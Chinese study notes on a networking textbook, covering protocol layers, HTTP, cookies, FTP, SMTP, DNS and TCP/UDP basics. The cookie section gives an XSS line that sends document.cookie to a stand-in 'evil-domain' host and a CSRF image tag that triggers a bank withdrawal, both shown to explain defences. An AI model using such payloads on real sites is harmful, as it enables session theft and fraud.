# 计算机网络

Computer Networking：A Top-Down Approach，Sixth Edition，ISBN: 9787111453789

## 第一章 计算机网络和因特网

### 1.1 因特网

- 因特网由主机（Host）组成
- 主机通过通信链路（communication link）和分组交换机（packet switch）连接到一起
- 通信链路：同轴电缆、铜线、光纤、无线电频谱
- 分组交换机：路由器、链路层交换机
- ISP（Internet Service Provider）: 因特网服务提供商
- 通信方式由协议规定，最著名的协议就是TCP/IP协议
- [IETF](https://www.ietf.org/) 通过 [RFC](https://tools.ietf.org/rfc/index) 文档定义协议（Protocol）

### 1.2 接入网络

- 家庭接入：DSL、电缆、光纤
- 企业接入：以太网、WiFi
- 广域无线接入：3G、4G、5G、LTE

### 1.3 分组交换

* 时延
    * 处理时延：检查首部、确定转发的路径、位校验等
    * 排队时延：等待开始向链路传输，当流量大时需要排队
    * 传输时延：将整个分组传输到链路，第一位到最后一位
    * 传播时延：分组到达下一个路由器所需要的时间
* 丢包：流量过大，超过队列限制，包将会被丢弃
* 吞吐量：能够承载的流量（瞬时、平均、最大）

### 1.4 协议分层

* 应用层 - HTTP/SMTP/FTP - 报文（message）
* 传输层 - TCP/UDP - 报文段（segment）
* 网络层 - IP/路由选择 - 数据报（datagram）
* 链路层 - DOCSIS - 帧（frame）
* 物理层 - 物理媒体的协议 - 比特/位（Bit）

OSI模型在**应用层**与**传输层**之间还有

* 表示层 - ASCII/JPEG/GIF
* 会话层 - 比如SQL会话

### 1.5 网络安全

* 恶意软件
* 僵尸网络
* 病毒
* Dos攻击（Denial Of Service Attack）
    * 弱点攻击：系统或软件的漏洞
    * 带宽泛洪：发送大量流量，阻碍正常流量处理
    * 连接泛洪：开启大量TCP半开/全开的连接
* 分组嗅探：无线网、局域网等
* 伪造请求：IP哄骗等

##　第二章 应用层

### 2.1 进程通信

- 通过套接字（Socket）通信
- 通过*IP地址+端口号*区分

### 2.2 HTTP协议

* 默认端口 **80**
* 请求报文格式
    * 请求行  `请求方法 sp 请求URL sp 版本 cr lf`
    * 头部行  `头部字段名 : sp 头部字段值 cr lf`
    * 空行 `cr lf`
    * 请求体 
    * 示例：
    ```
    GET /somedir/page.html HTTP/1.1
    HOST: www.somescholl.edu
    Connection: close
    User-Agent: Mozila/5.0
    Accept-Language: fr
    ```
* 响应报文格式
    * 状态行 `版本 sp 状态码 sp 状态短语 cr lf`
    * 头部行 `头部字段名 : sp 头部字段值 cr lf`
    * 空行 `cr lf`
    * 响应体
    * 示例：
    ```
    HTTP/1.1 200 OK
    Connection: close
    Date: Tue, 09 Aug 2011 15:44:04 GMT
    Server: Apache/2.2.3 (CentOS)
    Last-Modified: Tue, 09 Aug 2011 15:11:03 GMT
    Content-Length: 6821
    Content-Type: text/html
    
    (data data data data ...)
    ```
* 持续连接 / 非持续连接：是否复用TCP连接
* Cookie：HTTP是无状态协议，Cookie用于识别用户
    * 响应头`Set-Cookie: <cookie名>=<cookie值>`用于设置Cookie
    * 请求头`Cookie: <cookie名1>=<cookie值1>; <cookie名2>=<cookie值2>`
    * 持久性
        * 可以指定特定的过期时间`Expires`或者有效期（单位秒）`Max-Age`
        * 指定`Expires`：`Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;`
        * 指定`Max-Age`：`Set-Cookie: id=a3fWa; Max-Age=3600;`
    * 安全性标记    
        * `Secure`标记Cookie只通过HTTPS发送请求
        * `HttpOnly`标记不能通过JavaScript访问Cookie，避免跨站脚本攻击（XSS）
        * 示例：`Set-Cookie: id=a3fWa; Secure; HttpOnly`
    * 作用域
        * `Domain`指定哪些主机域名可以接受Cookie
        * `Path`指定具体的路径（该路径下的子路径也会被匹配）
    * `SameSite`用于防止跨站请求伪造攻击（CSRF）
        * None 仍然发送
        * Strict 完全一致的URL下才会发送
        * Lax 图片加载或Frame调用时可以发送，跳转导航到页面时不发送
    * XSS攻击
        * 使用JavaScript访问Cookie进行跳转
        * 示例：`(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;`
        * `HttpOnly`标记一定程度上可以防止该问题
    * CSRF攻击
        * 其它网站上进行跳转，比如假装成图片，欺骗用户点击
        * 示例：`<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">`
        * 预防攻击
            * 对用户输入进行过滤
            * 敏感操作都需要确认
            * 敏感信息的Cookie只能拥有较短的生命周期

### 2.3 FTP协议

* 默认端口 **21**
* 使用两个连接
    * 控制连接（持续的）
    * 数据连接（非持续的）
* 请求命令
    * USER username
    * PASS password
    * LIST
    * ... 
* 响应
    * 331 Username OK, Password required 
    * 425 Can't open data connection
    * ...

### 2.4 邮件协议

* SMTP 简单邮件协议
    * HELO
    * MAIL FRON
    * RCPT TO
    * DATA
    * QUIT
* POP3
* IMAP

### 2.5 DNS协议

* 默认端口 **53**
* DNS的功能
    * 主机名到IP地址的转换
    * 主机别名：别名比主机名更加容易记忆（xxx.222.yyy.com - x2y.com）
    * 邮件服务器别名
    * 负载分配：多个IP对应一个主机名，返回顺序的IP地址集合
* 分布式的DNS服务器
    * 根DNS服务器
    * 顶级DNS服务器
    * 权威DNS服务器
    * 使用DNS缓存
    * 使用递归查询和迭代查询
* DNS的记录格式
    * 记录的格式 `(NAME, VALUE, TYPE, TTL)`
        * A类型 (relay1.bar.foo.com, 123.45.67.89, A) 
            * 指定域名对应的 IP 地址记录。
        * NS类型(foo.com, dns.foo.com, NS) 
            * 指定解析域名或子域名的 DNS 服务器。
        * CNAME类型(foo.com, relay1.bar.foo.com, CNAME)
            * 一个域名映射到另一个域名或 CNAME 记录 或 A记录
        * MX类型(foo.com, mail.bar.foo.com, MX)
            * 指定接收信息的邮件服务器
* DNS的报文格式
    * [RFC 1035 4. MESSAGES](https://tools.ietf.org/html/rfc1035.html)
    
## 第三章 传输层

* 网络层提供不同主机之间的通信方式
* 网络层是不可靠的，会出现分组丢失、篡改、冗余等
* 传输层提供不同主机上的进程之间通信的方法

### 3.1 多路复用与多路分解

* 多路分解
    * 检查运输层报文的头部字段
    * 交付到对应的套接字Socket
* 多路复用
    * 将套接字中的数据封装成报文
    * 交付到网络层进行下一步传输

#### 3.1.1 无连接的多路复用与多路分解

源端口 - 目标端口

* [UDP](https://tools.ietf.org/html/rfc768.html)
    * 控制精细化
    * 不需要建立连接
    * 无连接状态
    * 分组头部开销小
    * DNS采用UDP进行传输

#### 3.1.2 面向连接的多路复用与多路分解

源端口 - 目标端口
源IP - 目标IP

* [TCP](https://tools.ietf.org/html/rfc793.html)
    * 需要建立连接
    * 可靠传输
    * 滑动窗口
    * 拥塞控制
    * 超时重传
    * 定时器

### 3.2 UDP

```
0      7 8     15 16    23 24    31
+--------+--------+--------+--------+
|     Source      |   Destination   |
|      Port       |      Port       |
+--------+--------+--------+--------+
|                 |                 |
|     Length      |    Checksum     |
+--------+--------+--------+--------+
|
|          data octets ...
+---------------- ...

```

#### 3.2.1 Checksum校验和

* 发送端
    * 把伪首部（IP相关头）、UDP/TCP首部、UDP/TCP数据分为16位的字
    * 如果分出奇数个，则在数据的最后额外添加一个全部为0的16位的字
    * 把16位的校验和设为0
    * 所有16位的字相加求和（溢出的位需要继续加到低位上，一直循环）
    * 将和取反码，就是校验和
* 接收端
    * 同样分成16位的字
    * 原码相加，高位叠加到低位
    * 结果如果全是1则校验成功

### 3.3 TCP可靠数据传输

#### 3.3.1 如何建立可靠的数据传输

* Checksum（校验比特错误）
* 定时器（超时/重传分组，可能是分组丢失、分组超时、ACK响应超时等）
* 序列号（可以流水线发送多个分组，通过序列号区分）
* 确认（ACK机制，携带确认正确接收到的报文序列号）
* 窗口、流水线（控制网络传输的拥塞）

* MSS最大报文段长度（Max Segment Size）1460字节
    * 传输层的报文大小
* MTU最大传输单元（Max Transmission Unit）1500字节
    * 链路层的帧大小

**TCP具体机制见[TCP/IP详解卷1笔记](tcp.md)**

#### 3.3.2 估计往返时间RTT

* SampleRTT 一次采样的值
* EstimatedRTT 指数加权平均
    * EstimatedRTT = (1 - α) * EstimatedRTT + α * SampleRTT
    * RFC 6298参考值α = 0.125
* DevRTT 差值的指数加权平均，用于估算变化
    * DevRTT = (1 - β) * DevRTT + β * |SampleRTT - EstimatedRTT|
    * 参考值β = 0.25
* 设置超时重传时间
    * TimeoutInterval = EstimatedRTT + 4 * DevRTT

## 第四章 网络层

## 第五章 链路层

## 第六章 无线网络和移动网络

## 第七章 多媒体网络

## 第八章 计算机网络中的安全

## 第九章 网络管理